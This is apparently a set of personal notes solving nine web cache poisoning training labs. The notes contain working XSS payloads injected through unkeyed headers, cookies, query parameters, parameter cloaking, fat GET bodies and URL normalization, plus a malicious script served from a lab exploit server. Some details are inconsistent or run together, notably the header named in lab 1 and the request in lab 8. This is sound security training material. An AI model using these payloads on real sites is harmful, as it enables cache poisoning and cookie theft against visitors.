### 1. Lab: Web cache poisoning with an unkeyed header
> This lab is vulnerable to web cache poisoning because it handles input from an unkeyed header in an unsafe way. An unsuspecting user regularly visits the site's home page. To solve this lab, poison the cache with a response that executes `alert(document.cookie)` in the visitor's browser.

We will check with param miner extension if there is any unkeyed headers, and we got `X-Forwarded-For` header, so I have tried to enter `example.com` in the header and it got reflected in the response. So I have modified with the XSS payload and it worked!
![[Pasted image 20250909163230.png]]
Payload: `X-Forwarded-Host: test.com"></script><script>alert(document.cookie)</script>`
### 2. Lab: Web cache poisoning with an unkeyed cookie
> This lab is vulnerable to web cache poisoning because cookies aren't included in the cache key. An unsuspecting user regularly visits the site's home page. To solve this lab, poison the cache with a response that executes `alert(1)` in the visitor's browser.

In this application, it is setting `fehost` cookie which is reflected in the response, so we will use XSS payload instead of the actual cookie.
![[Pasted image 20250909164204.png]]
![[Pasted image 20250909164537.png]]
Payload Cookie: `fehost="-alert(1)-"`
### 3. Lab: Web cache poisoning with multiple headers
> This lab contains a web cache poisoning vulnerability that is only exploitable when you use multiple headers to craft a malicious request. A user visits the home page roughly once a minute. To solve this lab, poison the cache with a response that executes `alert(document.cookie)` in the visitor's browser.

I started by experimenting with cache poisoning vectors. Adding a cache-buster query parameter along with the `X-Forwarded-Host: example.com` header produced no effect. However, switching to the `X-Forwarded-Scheme` header revealed more. Any value other than `HTTPS` caused the server to issue a **302 redirect**, and the `Location` header clearly showed that I was being redirected to the same resource but over `https://`.
The real breakthrough came when I combined the two headers: `X-Forwarded-Host: example.com` and `X-Forwarded-Scheme: nothttps`. This time, the **Location header** pointed to `https://example.com/`, showing that I could influence the cache key and potentially poison it.
With this confirmed, I moved to the **exploit server**. I created a malicious file under the exact same path as the vulnerable JavaScript: `/resources/js/tracking.js`. 
Body payload: `alert(document.cookie)`
Headers: `X-Forwarded-Host: <YOUR-EXPLOIT-SERVER-ID>.exploit-server.net` and `X-Forwarded-Scheme: nothttps`
![[Pasted image 20250909172146.png]]
Finally, I removed the cache-buster and replayed the request until I re-poisoned the cache without extra parameters. When I reloaded the home page as if I were a victim, the browser executed the script and triggered `alert(document.cookie)`. By keeping the cache poisoned until a real user visited, the attack successfully forced them to load my malicious JavaScript, completing the lab.
### 4. Lab: Targeted web cache poisoning using an unknown header
> This lab is vulnerable to web cache poisoning. A victim user will view any comments that you post. To solve this lab, you need to poison the cache with a response that executes `alert(document.cookie)` in the visitor's browser. However, you also need to make sure that the response is served to the specific subset of users to which the intended victim belongs.

![[Pasted image 20250909174627.png]]
![[Pasted image 20250909174613.png]]
### 5. Lab: Web cache poisoning via an unkeyed query string
> This lab is vulnerable to web cache poisoning because the query string is unkeyed. A user regularly visits this site's home page using Chrome.
To solve the lab, poison the home page with a response that executes `alert(1)` in the victim's browser.

I experimented with arbitrary query parameters in the request and observed that the server still returned a **cache hit** even when the parameters changed. This indicated that query parameters were **not included in the cache key**. Next, I tested the **Origin header** as a cache buster. Adding it to the request resulted in cache misses, which confirmed that this header could be used to manipulate cache behavior.
When I triggered a cache miss, I noticed that my injected parameters were reflected in the server’s response. This meant that if such a response were cached, the reflected payload would persist even after removing the query parameters. With this in mind, I injected an XSS payload by breaking out of the reflected string: `GET /?evil='/><script>alert(1)</script>`
![[Pasted image 20250910164312.png]]Finally, I removed the **Origin** header and placed my XSS payload directly in the query string. I replayed this request until I successfully poisoned the cache for normal users. Loading the home page in a browser confirmed the attack: the popup executed as the injected payload was served from cache.
### 6. Lab: Web cache poisoning via an unkeyed query parameter
> This lab is vulnerable to web cache poisoning because it excludes a certain parameter from the cache key. A user regularly visits this site's home page using Chrome.
To solve the lab, poison the cache with a response that executes `alert(1)` in the victim's browser.

Same as before, this time we have to guess GET request
Send a request with a `utm_content` parameter that breaks out of the reflected string and injects an XSS payload:
`GET /?utm_content='/><script>alert(1)</script>`
![[Pasted image 20250910171040.png]]
### 7. Lab: Parameter cloaking
> This lab is vulnerable to web cache poisoning because it excludes a certain parameter from the cache key. There is also inconsistent parameter parsing between the cache and the back-end. A user regularly visits this site's home page using Chrome.
To solve the lab, use the parameter cloaking technique to poison the cache with a response that executes `alert(1)` in the victim's browser.

The lab is vulnerable due to **Rails parameter cloaking**. The `utm_content` parameter is excluded from the cache key, and appending a semicolon (`;`) allows you to smuggle in a second parameter, such as `callback`. Every page loads `/js/geolocate.js`, which executes a callback function. Normally, `callback` is keyed, but when appended via `utm_content`, it isn’t.
Payload: `GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)`
the cache key ignores the second parameter, but the response executes it. Once cached, any page loading `geolocate.js` will trigger `alert(1)`.
![[Pasted image 20250910183106.png]]
### 8. Lab: Web cache poisoning via a fat GET request
> This lab is vulnerable to web cache poisoning. It accepts `GET` requests that have a body, but does not include the body in the cache key. A user regularly visits this site's home page using Chrome.
To solve the lab, poison the cache with a response that executes `alert(1)` in the victim's browser.

Every page loads `/js/geolocate.js` with the callback `setCountryCookie()`. You send:
`GET /js/geolocate.js?callback=setCountryCookie`
to Burp Repeater and add a **duplicate `callback` parameter** in the request body. The response executes the _last_ callback while the **cache key still uses the first one** from the request line.
For example:
`GET /js/geolocate.js?callback=setCountryCookie callback=alert(1)`
Response:
`X-Cache-Key: /js/geolocate.js?callback=setCountryCookie alert(1)({"country":"United Kingdom"})`
This poisons the cached response with your malicious callback.
![[Pasted image 20250910183946.png]]
### 9. Lab: URL normalization
> This lab contains an XSS vulnerability that is not directly exploitable due to browser URL-encoding.
To solve the lab, take advantage of the cache's normalization process to exploit this vulnerability. Find the XSS vulnerability and inject a payload that will execute `alert(1)` in the victim's browser. Then, deliver the malicious URL to the victim.

First, send a request to a non-existent path like `GET /random` in Burp Repeater and observe that the requested path is reflected in the error message. Inject an XSS payload directly into the path, for example:
`GET /random</p><script>alert(1)</script><p>foo`
When tested directly in the browser, the payload won’t execute because the browser URL-encodes it. However, if you poison the cache with this payload in Burp Repeater and then load the same URL in the browser, the payload executes — this happens because the cache stores the decoded version, resulting in a cache hit with the injected script.
Finally, re-poison the cache and immediately submit the malicious URL using the **"Deliver link to victim"** option in the lab. The victim’s visit triggers the payload, solving the lab. ✅